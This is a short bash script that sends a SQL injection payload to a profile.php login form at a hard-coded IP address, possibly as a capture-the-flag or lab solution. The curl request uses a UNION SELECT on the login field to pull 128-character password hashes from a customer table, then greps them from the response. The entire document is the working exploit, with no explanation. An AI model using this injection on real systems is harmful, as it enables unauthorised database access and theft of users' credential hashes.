#!/bin/bash

curl -sk 'https://46.105.49.65/6682b3a4fc93/profile.php' \
     -d "login=vic511&pass=' union select 1,'vic511',3,password,5 from customer where length(password)=128#" \
     | grep -oE '[0-9a-f]{128}'
